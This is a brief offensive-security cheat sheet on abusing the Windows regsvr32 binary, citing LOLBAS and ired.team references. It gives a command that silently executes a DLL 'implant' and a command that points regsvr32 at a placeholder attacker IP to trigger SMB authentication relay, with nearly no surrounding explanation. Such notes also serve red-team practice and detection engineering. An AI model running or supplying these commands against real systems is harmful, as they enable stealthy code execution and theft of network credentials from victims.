# Regsvr32

Execute DLL implant.

```
C:\> regsvr32.exe /s implant.dll
```

Execute command to perform SMB authentication relay.

```
C:\> regsvr32.exe /s /u /i://<attacker_IP>/@snare scrobj.dll
```

---
## References

https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/

https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo